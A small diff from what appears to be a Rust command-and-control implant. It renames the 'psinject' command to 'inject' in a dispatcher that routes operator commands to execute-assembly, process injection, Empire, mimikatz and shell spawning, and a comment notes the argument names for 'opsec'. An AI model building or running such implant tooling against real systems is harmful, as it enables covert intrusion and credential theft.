@@ -112,7 +112,7 @@ fn link_command(command: String) -> String {
     // the args should all be changed for better opsec
     match args[0] {
         "execute-assembly"  => nonstd::execute_assembly(args),
-        "psinject"          => nonstd::process_injection(args),
+        "inject"            => nonstd::process_injection(args),
         "empire"            => nonstd::empire(args),
         "mimikatz"          => nonstd::mimikatz(args),
         "cmd"               => command_spawn(args),
